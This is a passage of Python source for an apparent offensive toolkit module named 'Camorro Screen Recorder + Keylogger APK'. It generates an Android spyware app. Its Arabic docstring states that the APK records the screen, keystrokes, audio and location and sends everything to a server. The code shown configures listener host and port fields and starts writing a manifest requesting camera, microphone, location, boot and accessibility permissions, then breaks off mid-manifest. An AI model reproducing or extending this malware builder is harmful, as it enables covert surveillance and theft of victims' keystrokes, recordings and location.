#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Camorro Screen Recorder + Keylogger APK v3.0
APK يسجل كل شيء: الشاشة (فيديو)، لوحة المفاتيح، الصوت، الموقع
ويرسل كل شيء إلى السيرفر مباشرة
"""

import os
import tempfile
from core.utils import print_status, pause, input_target, save_result
from core.colors import bcolors

class ScreenRecorderAPK:
    def __init__(self):
        self.lhost = None
        self.lport = None
        self.temp_dir = tempfile.mkdtemp(prefix="camorro_rec_")

    def generate(self):
        """Generate screen recording APK"""
        project = os.path.join(self.temp_dir, "recorder_apk")
        os.makedirs(f"{project}/app/src/main/java/com/camorro/recorder", exist_ok=True)
        os.makedirs(f"{project}/app/src/main/res/xml", exist_ok=True)
        os.makedirs(f"{project}/app/src/main/res/values", exist_ok=True)
        os.makedirs(f"{project}/app/src/main/res/raw", exist_ok=True)

        # ---- AndroidManifest.xml ----
        manifest = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.camorro.recorder">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
    <uses-permission
